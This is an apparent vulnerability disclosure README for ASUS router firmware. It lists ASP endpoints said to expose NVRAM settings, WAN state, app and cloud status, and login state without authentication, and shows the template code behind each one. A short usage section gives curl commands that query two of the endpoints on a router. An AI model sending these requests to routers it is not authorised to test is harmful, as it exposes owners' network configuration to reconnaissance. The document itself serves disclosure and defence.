# ASUS Router ASP Endpoints Information Disclosure – PoC

## Description
This repository documents multiple publicly accessible ASP endpoints found in ASUS router firmware web interfaces that expose sensitive information without authentication.

## Exposed Endpoints & PoC

### ureip.asp
```
ureIP = <% nvram_dump("urelease",""); %>;
```

### WAN_info.asp
```
var wans_dualwan = '<% nvram_get("wans_dualwan"); %>'.split(" ");
if(wans_dualwan != ""){
    var ewan_index = wans_dualwan.indexOf("wan");
    autodet_state = (ewan_index == 0)? '<% nvram_get("autodet_state"); %>': '<% nvram_get("autodet1_state"); %>';
}
else{
    autodet_state = '<% nvram_get("autodet_state"); %>';
}
<% wanstate(); %>
<% dual_wanstate(); %>
```

### update_cloudstatus.asp
```
<% cloud_status(); %>
```

### update_appstate.asp
```
<% apps_state_info(); %>
```

### update_applist.asp
```
apps_array = <% apps_info("asus"); %>;
apps_http_port = "<% nvram_get("dm_http_port"); %>";
usb_is_exist = <% usb_is_exist(); %>;
```

### remote.asp
```
router_ip = "<% nvram_get("lan_gateway"); %>";
function testRemote(){
    return router_ip;
}
```

### Nologin.asp
```
<% login_state_hook(); %>
```

### manifest.asp
```
<html manifest="/manifest.appcache">
```

### blocking.asp
Uses multiple backend calls such as:
```
<% nvram_get("sw_mode"); %>
<% get_header_info(); %>
<% bwdpi_redirect_info(); %>
```

## PoC Usage
```
curl http://ROUTER_IP/ureip.asp
curl http://ROUTER_IP/WAN_info.asp
```

## Author
Ebubekir Bastama
